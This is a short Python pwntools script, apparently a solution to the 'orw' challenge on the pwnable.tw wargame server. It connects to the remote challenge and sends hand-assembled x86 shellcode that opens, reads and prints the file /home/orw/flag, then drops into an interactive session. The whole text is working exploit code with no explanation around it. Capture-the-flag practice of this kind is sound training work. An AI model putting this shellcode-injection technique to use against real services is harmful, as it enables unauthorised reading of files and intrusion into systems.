from pwn import *

server = remote('chall.pwnable.tw', 10001)
#server = gdb.debug('./orw')

server.read()

shellcode = ''
shellcode += asm('xor eax, eax')
shellcode += asm('push eax')
shellcode += asm('add eax, 0x5')
shellcode += asm('xor ebx, ebx')
shellcode += asm('push 0x67616c66')
shellcode += asm('push 0x2f77726f')
shellcode += asm('push 0x2f656d6f')
shellcode += asm('push 0x682f2f2f')
shellcode += asm('mov ebx, esp')
shellcode += asm('xor edx, edx')
shellcode += asm('int 0x80')

shellcode += asm('xor eax, eax')
shellcode += asm('add eax, 0x3')
shellcode += asm('mov ecx, ebx')
shellcode += asm('xor ebx, ebx')
shellcode += asm('add ebx, 0x3')
shellcode += asm('add edx, 0x28')
shellcode += asm('int 0x80')

shellcode += asm('xor eax, eax')
shellcode += asm('add eax, 0x4')
shellcode += asm('xor ebx, ebx')
shellcode += asm('add ebx, 0x1')
shellcode += asm('int 0x80')

server.send(shellcode)
print(server.read())
server.interactive()
